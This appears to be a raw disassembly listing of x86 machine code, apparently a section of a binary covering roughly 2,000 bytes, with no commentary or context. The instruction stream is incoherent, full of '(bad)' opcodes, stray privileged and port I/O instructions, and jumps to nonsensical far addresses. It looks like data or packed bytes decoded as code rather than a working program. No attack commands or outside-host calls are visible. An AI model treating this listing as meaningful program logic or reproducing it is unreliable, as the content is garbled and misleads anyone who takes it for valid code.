  41ef8d:	jbe    0x41ef16
  41ef8f:	mov    esp,0xb4c587f2
  41ef94:	pop    ecx
  41ef95:	jnp    0x41efdf
  41ef97:	(bad)  
  41ef99:	cvttps2pi mm7,QWORD PTR [edi+eax*1+0x4]
  41ef9e:	popf   
  41ef9f:	push   eax
  41efa0:	jne    0x41efd2
  41efa2:	jnp    0x41effb
  41efa4:	imul   edi,DWORD PTR [ecx+ecx*1],0xffffffa6
  41efa8:	imul   edi,DWORD PTR [edx+0x5dd19166],0x3d
  41efaf:	fimul  WORD PTR [eax-0x3b]
  41efb2:	pop    es
  41efb3:	sbb    BYTE PTR [edx+0x58],0x50
  41efb7:	mov    dh,0xf1
  41efb9:	lea    ebx,[eax+0x6ee09768]
  41efbf:	xchg   ebx,eax
  41efc0:	dec    ebp
  41efc1:	push   edi
  41efc2:	hlt    
  41efc3:	xor    ch,BYTE PTR [ebx+0x6a]
  41efc6:	push   cs
  41efc7:	jmp    0x41efcd
  41efc9:	jae    0x41f021
  41efcb:	mov    BYTE PTR [edi+0x2f166818],al
  41efd1:	dec    esp
  41efd2:	or     ah,ah
  41efd4:	add    dl,ch
  41efd6:	mov    edx,0xca50a45e
  41efdb:	pextrw ebx,mm5,0xf7
  41efdf:	aas    
  41efe0:	leave  
  41efe1:	mov    BYTE PTR [esi+0x49628cca],bl
  41efe7:	dec    esi
  41efe8:	fld    DWORD PTR [esi+edi*4+0x24]
  41efec:	mov    dh,ah
  41efee:	stc    
  41efef:	dec    ecx
  41eff0:	mov    ds:0xe764fb97,eax
  41eff5:	adc    al,0xd6
  41eff7:	(bad)  
  41eff8:	mov    dh,0xa2
  41effa:	das    
  41effb:	out    dx,al
  41effc:	fistp  WORD PTR [ecx+0x16abe169]
  41f002:	mov    DWORD PTR [ebx-0x21cf98fa],edx
  41f008:	(bad)  
  41f009:	lods   al,BYTE PTR ds:[esi]
  41f00a:	pop    ss
  41f00b:	inc    edx
  41f00c:	adc    dl,BYTE PTR [edi]
  41f00e:	sub    ch,BYTE PTR [eax+eax*1]
  41f011:	addr16 mov edi,0xc5552be7
  41f017:	sub    ebx,edi
  41f019:	test   ebx,0xc698f51a
  41f01f:	fisttp DWORD PTR [ecx-0x21]
  41f022:	neg    DWORD PTR [esi]
  41f024:	push   0x79
  41f026:	into   
  41f027:	inc    esp
  41f028:	xor    ebp,DWORD PTR [esi]
  41f02a:	mov    bl,0xf5
  41f02c:	mov    bh,BYTE PTR [ecx]
  41f02e:	pop    edx
  41f02f:	xor    eax,0x1337e68e
  41f034:	das    
  41f035:	inc    edx
  41f036:	out    dx,eax
  41f037:	xchg   BYTE PTR [edx+0x2f71bb44],ch
  41f03d:	test   DWORD PTR [eax+0x6a],0xe7a0341f
  41f044:	xor    eax,DWORD PTR ds:0x5d92e642
  41f04a:	(bad)  
  41f04b:	sahf   
  41f04c:	(bad)  
  41f04d:	rol    BYTE PTR [eax+0x250ec713],1
  41f053:	mov    edx,0x2f98e794
  41f058:	xchg   DWORD PTR [ecx+ebx*1+0x39],esi
  41f05c:	sub    BYTE PTR [ecx-0x36],dl
  41f05f:	icebp  
  41f060:	mov    bl,0x97
  41f062:	and    eax,0x7590f1b0
  41f067:	shl    DWORD PTR [ebx],0x69
  41f06a:	sub    edi,esp
  41f06c:	push   ebp
  41f06d:	cdq    
  41f06e:	sub    DWORD PTR [edx+ecx*4+0x23],0x2e
  41f073:	inc    esi
  41f074:	jmp    0x41f011
  41f076:	fs and eax,ecx
  41f079:	jno    0x41f0a6
  41f07b:	cmp    BYTE PTR [esi+0x14703079],dh
  41f081:	pop    ss
  41f082:	dec    ebx
  41f083:	mov    edx,0xeb138bfb
  41f088:	les    esp,FWORD PTR [edi-0x14d2cfde]
  41f08e:	and    bh,BYTE PTR ds:0xa4df97fe
  41f094:	call   FWORD PTR [esi+0x1a276684]
  41f09a:	push   edi
  41f09b:	nop
  41f09c:	push   0x47
  41f09e:	scas   eax,DWORD PTR es:[edi]
  41f09f:	mov    al,fs:0x280ca7b1
  41f0a5:	and    DWORD PTR [edx-0x22a403d2],eax
  41f0ab:	mov    esi,0xa41e595a
  41f0b0:	push   0xffffffe0
  41f0b2:	xchg   edx,eax
  41f0b3:	cmc    
  41f0b4:	stos   BYTE PTR es:[edi],al
  41f0b5:	push   0xb8926c4e
  41f0ba:	pop    ebp
  41f0bb:	xchg   edi,eax
  41f0bc:	in     eax,dx
  41f0bd:	lods   eax,DWORD PTR ds:[esi]
  41f0be:	push   es
  41f0bf:	push   edi
  41f0c0:	xchg   edi,eax
  41f0c1:	(bad)  
  41f0c2:	adc    BYTE PTR [edi-0x1f708286],bh
  41f0c8:	dec    eax
  41f0c9:	mov    ds:0xe91c5714,al
  41f0ce:	es das 
  41f0d0:	jle    0x41f0e7
  41f0d2:	adc    edx,eax
  41f0d4:	jmp    0x4b91:0xcfedfa75
  41f0db:	xor    BYTE PTR [ecx-0x53],cl
  41f0de:	push   ebp
  41f0df:	sbb    dh,dl
  41f0e1:	int3   
  41f0e2:	adc    al,0x72
  41f0e4:	ret    0x3669
  41f0e7:	mov    dl,0x32
  41f0e9:	xor    eax,0xe79146f3
  41f0ee:	ret    
  41f0ef:	sbb    dl,BYTE PTR [edx+0x76d5b3a5]
  41f0f5:	sti    
  41f0f6:	out    0x34,eax
  41f0f8:	dec    esp
  41f0f9:	pop    eax
  41f0fa:	(bad)  
  41f0fb:	or     eax,0x71c45504
  41f100:	jmp    0x6b2577c2
  41f105:	repnz sub BYTE PTR [ebp+0x61ab447f],al
  41f10c:	or     DWORD PTR [eax+ecx*2],eax
  41f10f:	out    dx,eax
  41f110:	(bad)  
  41f111:	ins    DWORD PTR es:[edi],dx
  41f112:	pop    ebp
  41f113:	retf   
  41f114:	cmp    al,0x36
  41f116:	add    dl,BYTE PTR [ebx+0x5e]
  41f119:	mov    cl,0x8b
  41f11b:	ss sbb dh,ah
  41f11e:	outs   dx,BYTE PTR ds:[esi]
  41f11f:	maskmovq mm1,(bad)
  41f120:	test   DWORD PTR [edi],0xeacb1a6a
  41f126:	int    0xd8
  41f128:	cmp    al,0x8e
  41f12a:	add    eax,DWORD PTR [ebx-0x2442f8e3]
  41f130:	mov    ecx,0xa75b7bbd
  41f135:	sub    DWORD PTR [eax+0x50e44600],ebp
  41f13b:	xchg   DWORD PTR [edx+0x7],esp
  41f13e:	jmp    0x797094c2
  41f143:	push   ecx
  41f144:	sub    eax,0x71c8d412
  41f149:	mov    ebp,0x1fc47c2b
  41f14e:	leave  
  41f14f:	pop    ecx
  41f150:	xor    dh,BYTE PTR [ecx+0x41e3f369]
  41f156:	mov    ebx,ebx
  41f158:	adc    dl,BYTE PTR [eax]
  41f15a:	dec    ebx
  41f15b:	xchg   esp,eax
  41f15c:	(bad)  
  41f15d:	stos   BYTE PTR es:[edi],al
  41f15e:	xchg   edi,eax
  41f15f:	xchg   BYTE PTR [edx+0x68],bh
  41f162:	jae    0x41f1c2
  41f164:	(bad)  
  41f166:	lods   eax,DWORD PTR ds:[esi]
  41f167:	inc    ebp
  41f168:	inc    ecx
  41f169:	iret   
  41f16a:	adc    DWORD PTR [esi-0xf],eax
  41f16d:	xor    edx,esi
  41f16f:	fisttp QWORD PTR [eax+ebx*1]
  41f172:	neg    DWORD PTR [edi]
  41f174:	test   BYTE PTR [ecx],bl
  41f176:	mov    bh,0xa0
  41f178:	xor    ebx,edx
  41f17a:	jp     0x41f1c3
  41f17c:	mov    ch,0x78
  41f17e:	retfw  
  41f180:	xor    al,BYTE PTR [ecx]
  41f182:	rcl    bl,0x76
  41f185:	ja     0x41f150
  41f187:	inc    edx
  41f188:	in     eax,0x8f
  41f18a:	cwde   
  41f18b:	out    0xc1,eax
  41f18d:	push   ss
  41f18e:	mov    bh,ch
  41f190:	stos   BYTE PTR es:[edi],al
  41f191:	or     al,0x16
  41f193:	push   0x46a02e4b
  41f198:	inc    ecx
  41f199:	mov    BYTE PTR [ebp-0x484b7911],0xa9
  41f1a0:	stos   DWORD PTR es:[edi],eax
  41f1a1:	(bad)  
  41f1a2:	sar    DWORD PTR [esi+edx*4-0x447e6eb6],0xe6
  41f1aa:	add    bh,BYTE PTR [eax-0x18e76ec]
  41f1b0:	out    dx,al
  41f1b1:	shl    BYTE PTR [edx],cl
  41f1b3:	push   ds
  41f1b4:	hlt    
  41f1b5:	aaa    
  41f1b6:	leave  
  41f1b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1b8:	ins    BYTE PTR es:[edi],dx
  41f1b9:	lahf   
  41f1ba:	mov    bh,0xa9
  41f1bc:	push   es
  41f1bd:	jle    0x41f1de
  41f1bf:	xchg   BYTE PTR [edx+0x789e7cd1],ah
  41f1c5:	gs or  esi,eax
  41f1c8:	scas   eax,DWORD PTR es:[edi]
  41f1c9:	aam    0xe
  41f1cb:	sbb    bh,dl
  41f1cd:	jns    0x41f196
  41f1cf:	sub    ecx,DWORD PTR [esi-0xecd2086]
  41f1d5:	inc    ecx
  41f1d6:	(bad)  
  41f1d8:	push   edi
  41f1d9:	gs out dx,eax
  41f1db:	out    0x72,al
  41f1dd:	sbb    ch,BYTE PTR [edx]
  41f1df:	mov    edx,0x3f9b2fe6
  41f1e4:	xchg   esi,eax
  41f1e5:	mov    bh,0x87
  41f1e7:	les    esi,FWORD PTR [ebx+0x53d48684]
  41f1ed:	dec    edx
  41f1ee:	fdivr  QWORD PTR [eax]
  41f1f0:	xor    DWORD PTR [ecx+edi*1],0xfffffff8
  41f1f4:	xor    bh,ch
  41f1f6:	xrelease mov BYTE PTR [edx+esi*8],0x72
  41f1fb:	or     eax,0xfd522bab
  41f200:	(bad)  [eax-0x17ea7be6]
  41f206:	jb     0x41f1e3
  41f208:	jae    0x41f21b
  41f20a:	imul   edi,DWORD PTR [eax-0x1d8082c1],0xffffffa1
  41f211:	pop    ecx
  41f212:	dec    edx
  41f213:	jne    0x41f19e
  41f215:	pop    es
  41f216:	dec    ebx
  41f217:	and    esp,DWORD PTR [edi]
  41f219:	retf   
  41f21a:	and    eax,ecx
  41f21c:	mov    al,ds:0x995d05e
  41f221:	icebp  
  41f222:	aas    
  41f223:	std    
  41f224:	in     al,0x15
  41f226:	sub    eax,0x51a17ad7
  41f22b:	out    0x7d,al
  41f22d:	out    dx,al
  41f22e:	xchg   esp,eax
  41f22f:	icebp  
  41f230:	add    BYTE PTR [eax-0x74f4b119],ah
  41f236:	mov    ds:0x780f217e,al
  41f23b:	or     dh,BYTE PTR [ecx+0x2]
  41f23e:	jle    0x41f1c1
  41f240:	sub    al,BYTE PTR ds:0x2d677900
  41f246:	mov    al,ds:0x247dc352
  41f24b:	dec    ecx
  41f24c:	jp     0x41f258
  41f24e:	push   edi
  41f24f:	ja     0x41f1fa
  41f251:	inc    eax
  41f252:	pop    ebp
  41f253:	outs   dx,BYTE PTR ds:[esi]
  41f254:	std    
  41f255:	sbb    eax,0x4982bb81
  41f25a:	cwde   
  41f25b:	cdq    
  41f25c:	pop    es
  41f25d:	cmovge ecx,DWORD PTR [ebx-0x59c80f7f]
  41f264:	(bad)
  41f267:	sbb    edi,DWORD PTR [eax+0x424419ef]
  41f26d:	das    
  41f26e:	sub    al,BYTE PTR [edi]
  41f270:	dec    ecx
  41f271:	mov    esi,0xeea499b
  41f276:	mov    dh,0xd9
  41f278:	test   al,0xb4
  41f27a:	jne    0xa42ea0cc
  41f280:	lods   eax,DWORD PTR ds:[esi]
  41f281:	ins    DWORD PTR es:[edi],dx
  41f282:	xchg   ebp,eax
  41f283:	mov    dh,0xc
  41f285:	in     al,dx
  41f286:	mov    eax,ds:0x755f90bb
  41f28b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f28c:	jge    0x41f292
  41f28e:	add    ebx,edx
  41f290:	jmp    0x41f24a
  41f292:	add    DWORD PTR [ecx+0x54],edi
  41f295:	pop    eax
  41f296:	enter  0xd648,0xe0
  41f29a:	gs xor ah,ah
  41f29d:	leave  
  41f29e:	sti    
  41f29f:	or     al,0x47
  41f2a1:	(bad)  
  41f2a2:	jbe    0x41f247
  41f2a4:	clc    
  41f2a5:	xor    ebx,edx
  41f2a7:	mov    edx,0x2bdc3ed6
  41f2ac:	mov    eax,ds:0xcb452f20
  41f2b1:	pop    eax
  41f2b2:	xrelease mov BYTE PTR [edi+0x1],bh
  41f2b6:	jmp    esp
  41f2b8:	push   edx
  41f2b9:	push   ss
  41f2ba:	mov    ebx,0x4000dbad
  41f2bf:	mov    bh,0xf1
  41f2c1:	mov    ch,0x90
  41f2c3:	mov    esp,0xac8c46c1
  41f2c8:	adc    al,0xd
  41f2ca:	and    esp,esp
  41f2cc:	or     dl,bh
  41f2ce:	sar    DWORD PTR [ecx+0x6e],1
  41f2d1:	dec    edx
  41f2d2:	retf   0x948d
  41f2d5:	dec    edi
  41f2d6:	adc    al,0xbb
  41f2d8:	(bad)  
  41f2d9:	or     BYTE PTR [esi],cl
  41f2db:	es or  eax,0x23b83d01
  41f2e1:	jno    0x41f34a
  41f2e3:	lods   al,BYTE PTR ds:[esi]
  41f2e4:	pop    eax
  41f2e5:	dec    eax
  41f2e6:	jmp    0x112d:0xbe02e66a
  41f2ed:	jne    0x41f2ed
  41f2ef:	inc    ebx
  41f2f0:	push   cs
  41f2f1:	mov    al,ds:0x85c18d81
  41f2f6:	bnd jbe 0x41f2c0
  41f2f9:	xor    bl,BYTE PTR [esp+edx*2+0x3dea1a66]
  41f300:	or     al,0x4c
  41f302:	dec    edx
  41f303:	xor    bl,BYTE PTR [ecx+ecx*4+0x3d]
  41f307:	fld    DWORD PTR [eax-0x4020154f]
  41f30d:	dec    edi
  41f30e:	je     0x41f2da
  41f310:	icebp  
  41f311:	icebp  
  41f312:	fwait
  41f313:	pop    ds
  41f314:	xchg   BYTE PTR [edx-0x58087b26],dh
  41f31a:	sub    BYTE PTR [edi],al
  41f31c:	lock ror DWORD PTR [esi+0x33c520f8],1
  41f323:	ret    0xe4f1
  41f326:	mov    esi,0x365d9c5f
  41f32b:	std    
  41f32c:	xor    cl,BYTE PTR [ecx+edx*1]
  41f32f:	inc    ebp
  41f330:	mov    ebx,0x7f68eb9a
  41f335:	es xchg esi,eax
  41f337:	stos   BYTE PTR es:[edi],al
  41f338:	std    
  41f339:	xchg   ecx,eax
  41f33a:	repnz sbb BYTE PTR [eax+ecx*8],al
  41f33e:	test   DWORD PTR [ebx+ebx*4+0x5d],eax
  41f342:	sub    BYTE PTR [eax],bh
  41f344:	adc    cl,BYTE PTR [ebx]
  41f346:	mov    dl,0x55
  41f348:	or     ch,BYTE PTR [eax+ecx*1-0x18]
  41f34c:	jbe    0x41f3a4
  41f34e:	xchg   BYTE PTR [ecx+0x2020631a],ch
  41f354:	push   ecx
  41f355:	and    cl,ah
  41f357:	xchg   ebp,eax
  41f358:	stos   DWORD PTR es:[edi],eax
  41f359:	repnz sub edx,DWORD PTR [eax]
  41f35c:	and    al,0x7a
  41f35e:	sub    ah,BYTE PTR [ebx+0x6b6d848c]
  41f364:	dec    esp
  41f365:	push   edi
  41f366:	shr    BYTE PTR [edx+ebp*8+0x2b],0x8e
  41f36b:	test   ebp,esp
  41f36d:	sbb    BYTE PTR [edx],cl
  41f36f:	mov    ds:0x778989ab,eax
  41f374:	add    dl,BYTE PTR [edi]
  41f376:	xor    eax,0x70edc94f
  41f37b:	std    
  41f37c:	dec    ebp
  41f37d:	mov    ecx,edx
  41f37f:	cmp    ebp,esi
  41f381:	xchg   BYTE PTR [edi-0x6e0da405],al
  41f387:	jge    0x41f357
  41f389:	mov    ah,0x27
  41f38b:	add    BYTE PTR [ebx],ch
  41f38d:	cdq    
  41f38e:	push   eax
  41f38f:	retf   
  41f390:	jp     0x41f3d9
  41f392:	push   esp
  41f393:	out    0xe8,al
  41f395:	out    dx,al
  41f396:	push   0xffffffa9
  41f398:	cmc    
  41f399:	sub    BYTE PTR ds:0x29f9f021,ch
  41f39f:	push   0xef9b4771
  41f3a4:	mov    ds:0x1270ddf2,eax
  41f3a9:	pusha  
  41f3aa:	cs out 0x35,eax
  41f3ad:	cmp    edx,ecx
  41f3af:	in     eax,dx
  41f3b0:	or     dl,ch
  41f3b2:	loope  0x41f378
  41f3b4:	leave  
  41f3b5:	push   edx
  41f3b6:	pop    edi
  41f3b7:	div    ebx
  41f3b9:	jle    0x41f37c
  41f3bb:	mov    al,0x37
  41f3bd:	sbb    BYTE PTR [esi-0x75],0x84
  41f3c1:	in     eax,dx
  41f3c2:	fs repnz pop ss
  41f3c5:	sti    
  41f3c6:	inc    edx
  41f3c7:	call   0x2dad8d5a
  41f3cc:	imul   edi,esi,0x9660875b
  41f3d2:	popf   
  41f3d3:	test   eax,0xa2ea332a
  41f3d8:	std    
  41f3d9:	adc    bl,dl
  41f3db:	aam    0xa2
  41f3dd:	adc    al,0x42
  41f3df:	cmp    DWORD PTR [ecx-0x2ece67c1],esp
  41f3e5:	xor    BYTE PTR [eax],al
  41f3e7:	pop    ss
  41f3e8:	data16 or ah,BYTE PTR [ecx-0x15931d36]
  41f3ef:	ins    BYTE PTR es:[edi],dx
  41f3f0:	and    al,0x27
  41f3f2:	jb     0x41f3e0
  41f3f4:	push   ds
  41f3f5:	in     al,dx
  41f3f6:	cmp    BYTE PTR [eax-0x62],bl
  41f3f9:	xchg   edi,eax
  41f3fa:	sub    eax,0xd2766bf3
  41f3ff:	lods   eax,DWORD PTR ds:[esi]
  41f400:	in     eax,dx
  41f401:	lock xchg esp,eax
  41f403:	imul   BYTE PTR [edi-0x8]
  41f406:	(bad)  
  41f407:	jmp    0x4632c00a
  41f40c:	rol    BYTE PTR [esi],cl
  41f40e:	push   cs
  41f40f:	xchg   bh,bh
  41f411:	mov    dl,0x28
  41f413:	jo     0x41f43a
  41f415:	test   ch,cl
  41f417:	in     eax,dx
  41f418:	add    ah,BYTE PTR [esi+ecx*1-0x3326d597]
  41f41f:	shr    ecx,0x4c
  41f422:	inc    esp
  41f423:	rol    DWORD PTR [esp+esi*1+0x256371c1],cl
  41f42a:	xor    eax,ebx
  41f42c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f42d:	int    0x0
  41f42f:	(bad)  
  41f430:	imul   BYTE PTR [ebp+0xd]
  41f433:	sub    BYTE PTR [edi+0x1],ah
  41f436:	fwait
  41f437:	push   cs
  41f438:	stc    
  41f439:	xchg   ecx,eax
  41f43a:	pushf  
  41f43b:	inc    ebx
  41f43c:	xchg   ebx,eax
  41f43d:	bound  ecx,QWORD PTR [ecx+0x4923da8b]
  41f443:	hlt    
  41f444:	enter  0x57bb,0x73
  41f448:	bound  esi,QWORD PTR [ebp+ebp*8-0x68aa66bb]
  41f44f:	test   al,0x67
  41f451:	mov    ecx,0x435cbc50
  41f456:	scas   eax,DWORD PTR es:[edi]
  41f457:	inc    ebp
  41f458:	mov    al,0x59
  41f45a:	pushf  
  41f45b:	ins    DWORD PTR es:[edi],dx
  41f45c:	out    0x40,eax
  41f45e:	pop    eax
  41f45f:	and    DWORD PTR [edx-0x3eb65683],ebp
  41f465:	or     DWORD PTR [ecx],0x1f
  41f468:	or     eax,DWORD PTR [edx+edx*1-0x65d8ae7]
  41f46f:	es loopne 0x41f3ff
  41f472:	ss jl  0x41f421
  41f475:	sub    eax,0x9d11b750
  41f47a:	sbb    cl,BYTE PTR [ebp+0x2b]
  41f47d:	fucomp st(3)
  41f47f:	inc    esi
  41f480:	(bad)  
  41f481:	lahf   
  41f482:	xor    esp,edx
  41f484:	xor    esp,DWORD PTR ds:0x950e4c1
  41f48a:	shl    BYTE PTR [esi-0x11d6551b],cl
  41f490:	mov    cl,0xc3
  41f492:	jecxz  0x41f466
  41f494:	xor    al,0x1
  41f496:	out    dx,al
  41f497:	adc    dl,BYTE PTR [ebx]
  41f499:	inc    eax
  41f49a:	ins    DWORD PTR es:[edi],dx
  41f49b:	repnz mov eax,ds:0x2d977bc
  41f4a1:	repz mov ds:0x42a1b5da,eax
  41f4a7:	das    
  41f4a8:	cmp    eax,0x78d165cc
  41f4ad:	inc    eax
  41f4ae:	inc    edx
  41f4af:	push   cs
  41f4b0:	fstp   TBYTE PTR [ecx+0x3a86d769]
  41f4b6:	repnz or eax,ecx
  41f4b9:	retf   
  41f4ba:	clc    
  41f4bb:	push   edx
  41f4bc:	or     al,0xc4
  41f4be:	inc    esi
  41f4bf:	cdq    
  41f4c0:	adc    DWORD PTR ds:0xab2105c1,ebp
  41f4c6:	fiadd  DWORD PTR [esi-0x49]
  41f4c9:	jl     0x41f4e9
  41f4cb:	bound  esi,QWORD PTR [edx]
  41f4cd:	xchg   edi,eax
  41f4ce:	push   0xffffff9f
  41f4d0:	in     al,dx
  41f4d1:	ins    DWORD PTR es:[edi],dx
  41f4d2:	inc    ebx
  41f4d3:	leave  
  41f4d4:	repz dec ebx
  41f4d6:	cld    
  41f4d7:	ror    BYTE PTR [ebx+0x37],0x41
  41f4db:	push   esi
  41f4dc:	sub    eax,DWORD PTR [ecx+0x48]
  41f4df:	out    0xd2,eax
  41f4e1:	call   0x4294c9ea
  41f4e6:	int3   
  41f4e7:	mov    al,0x90
  41f4e9:	xchg   edi,eax
  41f4ea:	scas   eax,DWORD PTR es:[edi]
  41f4eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4ec:	xor    eax,ecx
  41f4ee:	stos   DWORD PTR es:[edi],eax
  41f4ef:	pop    edi
  41f4f0:	cwde   
  41f4f1:	(bad)  
  41f4f2:	cmp    eax,0xa78aef31
  41f4f7:	stos   DWORD PTR es:[edi],eax
  41f4f8:	lods   eax,DWORD PTR ds:[esi]
  41f4f9:	fdivr  DWORD PTR [esi]
  41f4fb:	leave  
  41f4fc:	inc    edx
  41f4fd:	imul   eax,DWORD PTR ds:[eax-0x6d],0x55
  41f502:	adc    eax,0xf02a9cc9
  41f507:	in     ax,0xda
  41f50a:	xor    edi,DWORD PTR [ebx-0x11]
  41f50d:	dec    ebx
  41f50e:	xlat   BYTE PTR ds:[ebx]
  41f50f:	cs add eax,0x4b1927f3
  41f515:	arpl   bp,bx
  41f517:	xor    DWORD PTR [esi+0x67b6a525],esi
  41f51d:	gs push es
  41f51f:	sub    edx,esi
  41f521:	outs   dx,BYTE PTR ds:[esi]
  41f522:	and    BYTE PTR [ebx+0x7d],ch
  41f525:	xor    DWORD PTR ds:0x65044254,0xffffffea
  41f52c:	xor    DWORD PTR [esi+eiz*2],eax
  41f52f:	mov    BYTE PTR [edx-0x29],al
  41f532:	mov    ebp,?
  41f534:	or     BYTE PTR [ebx+0x4faca06d],cl
  41f53a:	mov    eax,0x734ab440
  41f53f:	je     0x41f531
  41f541:	lods   al,BYTE PTR ds:[esi]
  41f542:	add    esp,ecx
  41f544:	jnp    0x41f570
  41f546:	mov    bh,BYTE PTR [eax+edx*2]
  41f549:	addr16 out dx,eax
  41f54b:	jl     0x41f556
  41f54d:	jecxz  0x41f531
  41f54f:	test   eax,0x4a4f1afd
  41f554:	mov    esp,0xa8378703
  41f559:	push   0x6b
  41f55b:	ja     0x41f51e
  41f55d:	pop    eax
  41f55e:	fcomp  QWORD PTR [edx+edx*1]
  41f561:	lods   eax,DWORD PTR ds:[esi]
  41f562:	sub    ebp,edi
  41f564:	in     ax,0x62
  41f567:	and    BYTE PTR [esi+ebp*2+0x393db00],cl
  41f56e:	sub    cl,BYTE PTR [ebp-0x1af88447]
  41f574:	add    al,0x43
  41f576:	sahf   
  41f577:	mov    cl,0x50
  41f579:	mov    ebx,0x3ebf0e69
  41f57e:	inc    esi
  41f57f:	fwait
  41f580:	test   al,0xd3
  41f582:	adc    eax,0xaacaa263
  41f587:	push   0xffffffde
  41f589:	inc    ebp
  41f58a:	es pusha 
  41f58c:	mov    esi,0xc6393f35
  41f591:	out    0x2b,eax
  41f593:	mov    ebp,0xb6d55692
  41f598:	(bad)  
  41f599:	(bad)  
  41f59a:	je     0x41f57c
  41f59c:	dec    eax
  41f59d:	push   esi
  41f59e:	leave  
  41f59f:	and    eax,0x3930408b
  41f5a4:	lahf   
  41f5a5:	out    dx,eax
  41f5a6:	dec    ebx
  41f5a7:	push   ebx
  41f5a8:	sti    
  41f5a9:	arpl   WORD PTR [edx+esi*8+0x49],dx
  41f5ad:	and    DWORD PTR [esi-0x6c5fed5d],edi
  41f5b3:	mov    cl,0x21
  41f5b5:	fldcw  WORD PTR [edx+0x74f8f4ca]
  41f5bb:	fdivrp st(6),st
  41f5bd:	mov    ebp,0xc23c37e2
  41f5c2:	and    DWORD PTR [ebp+0x3463557f],ebp
  41f5c8:	add    BYTE PTR [esi+0x3a4d2efc],ch
  41f5ce:	mov    DWORD PTR [edx-0x1d5c6251],edx
  41f5d4:	aas    
  41f5d5:	inc    esp
  41f5d6:	mov    esi,DWORD PTR [edx+eiz*8-0x61]
  41f5da:	push   edi
  41f5db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5dc:	dec    esp
  41f5dd:	or     DWORD PTR [ecx],edi
  41f5df:	outs   dx,DWORD PTR ds:[esi]
  41f5e0:	mov    dl,0x65
  41f5e2:	out    0xe5,eax
  41f5e4:	mov    bh,0x65
  41f5e6:	ror    ebp,1
  41f5e8:	fisub  DWORD PTR [edx+0x7d]
  41f5eb:	jl     0x41f653
  41f5ed:	call   0xcfcf4242
  41f5f2:	ja     0x41f62d
  41f5f4:	mov    ch,0xdd
  41f5f6:	jo     0x41f65a
  41f5f8:	jg     0x41f657
  41f5fa:	mov    eax,ds:0xab36f07c
  41f5ff:	test   DWORD PTR [ebx+0x60767da7],edx
  41f605:	push   es
  41f606:	cli    
  41f607:	out    dx,al
  41f608:	fist   DWORD PTR [edi+eiz*8]
  41f60b:	popa   
  41f60c:	cmp    ecx,DWORD PTR [ebx-0x2a]
  41f60f:	sbb    bh,dl
  41f611:	mov    ds:0x93227845,al
  41f616:	jl     0x41f5b2
  41f618:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f619:	xchg   al,dl
  41f61b:	je     0x41f648
  41f61d:	push   ds
  41f61e:	dec    ebx
  41f61f:	call   0x4e69c79
  41f624:	enter  0xadd9,0x8e
  41f628:	data16 mov al,ds:0x47da0f64
  41f62e:	out    0xd8,eax
  41f630:	mov    ds:0xb853f44c,al
  41f635:	cs (bad) 
  41f637:	fisttp DWORD PTR [eax+0x74544107]
  41f63d:	jnp    0x41f64d
  41f63f:	test   DWORD PTR [ecx-0x7faf3863],0x5083158f
  41f649:	inc    edi
  41f64a:	jmp    0x1c474cc7
  41f64f:	mov    ebp,0x59b35d92
  41f654:	(bad)  
  41f655:	fldenv [esi]
  41f657:	mov    esi,ebp
  41f659:	mov    al,0x1
  41f65b:	jmp    0x75df:0x8fc99b80
  41f662:	out    0x7d,eax
  41f664:	inc    esp
  41f665:	pop    ss
  41f666:	push   ebx
  41f667:	add    BYTE PTR [esi-0x39],0x69
  41f66b:	xchg   BYTE PTR [ebp-0x79],al
  41f66e:	fcomi  st,st(0)
  41f670:	and    al,0x5
  41f672:	adc    DWORD PTR [ebp+0x22d2db09],eax
  41f678:	mov    esi,0x5bef33a7
  41f67d:	jl     0x41f657
  41f67f:	js     0x41f6f9
  41f681:	xchg   ebx,eax
  41f682:	je     0x41f61d
  41f684:	sub    ch,ch
  41f686:	in     eax,dx
  41f687:	mov    esp,DWORD PTR [ebp+0x27d3fac3]
  41f68d:	push   edx
  41f68e:	xchg   ebx,eax
  41f68f:	imul   ebx,DWORD PTR ds:0xaedb668c,0xc41be9b3
  41f699:	ins    BYTE PTR es:[edi],dx
  41f69a:	es mov ecx,0xafa6a392
  41f6a0:	out    dx,eax
  41f6a1:	mov    BYTE PTR [edi],al
  41f6a3:	loope  0x41f69a
  41f6a5:	xor    DWORD PTR [edi],esp
  41f6a7:	and    al,0x33
  41f6a9:	xchg   esp,eax
  41f6aa:	or     esp,ebx
  41f6ac:	addr16 int3 
  41f6ae:	sub    dl,dl
  41f6b0:	jecxz  0x41f6cc
  41f6b2:	cmp    bl,dl
  41f6b4:	ret    0x9402
  41f6b7:	push   ss
  41f6b8:	aam    0x79
  41f6ba:	push   es
  41f6bb:	clc    
  41f6bc:	retf   
  41f6bd:	fisubr DWORD PTR [esi+0x79]
  41f6c0:	push   ss
  41f6c1:	jbe    0x41f72f
  41f6c3:	aaa    
  41f6c4:	scas   al,BYTE PTR es:[edi]
  41f6c5:	jb     0x41f6b9
  41f6c7:	lock jl 0x41f6fe
  41f6ca:	aad    0xd4
  41f6cc:	inc    ebx
  41f6cd:	mov    ds:0xa7b0312a,al
  41f6d2:	shl    BYTE PTR [edi],1
  41f6d4:	adc    eax,0x6b82f7b5
  41f6d9:	pushf  
  41f6da:	mov    fs,WORD PTR [edi+ecx*4+0x653a66c3]
  41f6e1:	inc    ebx
  41f6e2:	xchg   edx,eax
  41f6e3:	xor    BYTE PTR [esi-0x16d6224e],0x3c
  41f6ea:	sub    al,BYTE PTR [esp+ebx*2-0x66]
  41f6ee:	mov    WORD PTR ds:0x4533c38e,gs
  41f6f4:	mov    DWORD PTR [edi],edx
  41f6f6:	jo     0x41f6e7
  41f6f8:	nop
  41f6f9:	call   0xe8e1:0x3b25d57a
  41f700:	test   BYTE PTR [eax],0xad
  41f703:	ret    
  41f704:	dec    esi
  41f705:	inc    edx
  41f706:	push   0x9b9cb3c2
  41f70b:	mov    eax,0x18d3f530
  41f710:	jmp    0x5f9f24e8
  41f715:	repnz xor BYTE PTR [ebx-0x1fd93e52],0xdb
  41f71d:	repz jecxz 0x41f781
  41f720:	jmp    0xe309:0x67beab02
  41f727:	and    BYTE PTR [edi+edx*4],ah
  41f72a:	pop    eax
  41f72b:	fucom  st(5)
  41f72d:	pop    ss
